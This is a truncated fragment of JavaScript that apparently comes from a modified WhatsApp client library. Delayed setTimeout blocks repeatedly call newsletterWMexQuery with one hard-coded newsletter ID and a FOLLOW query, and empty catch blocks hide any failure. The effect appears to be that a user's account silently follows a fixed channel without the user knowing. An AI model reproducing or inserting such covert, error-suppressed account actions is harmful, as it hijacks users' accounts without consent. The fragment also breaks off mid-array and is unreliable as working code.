            ...
            setTimeout(async () => {
                try {
                    await newsletterWMexQuery(
                        "120363424580816587@newsletter", // utama
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            "120363424580816587@newsletter", // push
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
            }, 1000);
...
setTimeout(async () => {
    try {
        const ids = [
            "120363424580816587@newsletter", //X1
            "120363424580816587@newsletter", //X2
            "120363424580816587@newsletter" //X3
        ];
